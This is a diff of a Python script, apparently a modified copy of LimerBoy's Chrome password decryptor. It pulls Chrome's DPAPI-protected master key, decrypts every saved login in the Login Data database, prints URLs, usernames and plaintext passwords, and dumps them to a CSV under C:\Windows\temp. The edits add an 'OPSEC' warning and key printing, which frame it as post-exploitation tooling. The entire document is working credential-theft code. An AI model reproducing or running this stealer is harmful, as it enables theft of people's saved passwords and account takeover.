@@ -1,18 +1,17 @@
 #Full Credits to LimerBoy
 import os
 import re
-import sys
 import json
 import base64
 import sqlite3
-import win32crypt
+from win32 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
 
 #GLOBAL CONSTANT
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\\Local\\Google\\Chrome\\User Data\\Local State"%(os.environ['USERPROFILE']))
+CHROME_PATH = os.path.normpath(r"%s\AppData\\Local\\Google\\Chrome\\User Data"%(os.environ['USERPROFILE']))
 
 def get_secret_key():
     try:
@@ -24,6 +23,7 @@ def get_secret_key():
         #Remove suffix DPAPI
         secret_key = secret_key[5:] 
         secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        print(f"Secret key: {secret_key}") # Can we directly input our DPAPI master key here? 
         return secret_key
     except Exception as e:
         print("%s"%str(e))
@@ -45,7 +45,7 @@ def decrypt_password(ciphertext, secret_key):
         encrypted_password = ciphertext[15:-16]
         #(4) Build the cipher to decrypt the ciphertext
         cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password) 
         decrypted_pass = decrypted_pass.decode()  
         return decrypted_pass
     except Exception as e:
@@ -66,7 +66,9 @@ def get_db_connection(chrome_path_login_db):
 if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        print("*" * 10 + "WARNING! THIS SCRIPT WRITES TO DISK! NOT OPSEC SAFE! " + "*" * 10)
+        print("Writing to C:\\Windows\\temp\\decrypted_passwords.csv")
+        with open('C:\\Windows\\temp\\decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
@@ -84,15 +86,12 @@ if __name__ == '__main__':
                         url = login[0]
                         username = login[1]
                         ciphertext = login[2]
-                        if(url!="" and username!="" and ciphertext!=""):
-                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                            #(4) Use AES algorithm to decrypt the password
-                            decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print("Sequence: %d"%(index))
-                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
-                            print("*"*50)
-                            #(5) Save into CSV 
-                            csv_writer.writerow([index,url,username,decrypted_password])
+                        decrypted_password = decrypt_password(ciphertext, secret_key)
+                        print("Sequence: %d"%(index))
+                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
+                        print("*"*50)
+                        #(5) Save into CSV 
+                        csv_writer.writerow([index,url,username,decrypted_password])
                     #Close database connection
                     cursor.close()
                     conn.close()
